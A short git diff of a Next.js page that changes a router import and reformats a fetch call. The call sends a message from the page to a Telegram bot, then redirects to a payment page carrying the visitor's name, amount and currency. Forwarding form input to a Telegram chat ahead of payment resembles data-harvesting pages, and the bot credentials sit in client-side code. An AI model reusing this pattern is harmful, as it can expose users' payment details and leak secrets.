@@ -1,8 +1,8 @@
 'use client'
+
 import { useState } from "react";
 import Image from "next/image";
-import { useRouter } from "next/router";
-
+import { useRouter } from "next/navigation"; // ✅ استخدم next/navigation بدل next/router
 
 export default function Home() {
   const router = useRouter();
@@ -28,13 +28,13 @@ export default function Home() {
     try {
       // إرسال الرسالة إلى Telegram
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    chat_id: TELEGRAM_CHAT_ID,
-    text
-  }),
-});
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text
+        }),
+      });
 
       // بعد الإرسال يمكن الانتقال لصفحة الدفع مع القيم
       const params = new URLSearchParams({ fullname, amount, currency }).toString();
@@ -50,6 +50,7 @@ export default function Home() {
   return (
     <div className="container bg-light py-5">
       <div className="row g-4">
+
         {/* Première carte */}
         <div className="col-12 col-lg-6">
           <div className="card text-bg-dark h-100 border-0 shadow overflow-hidden">
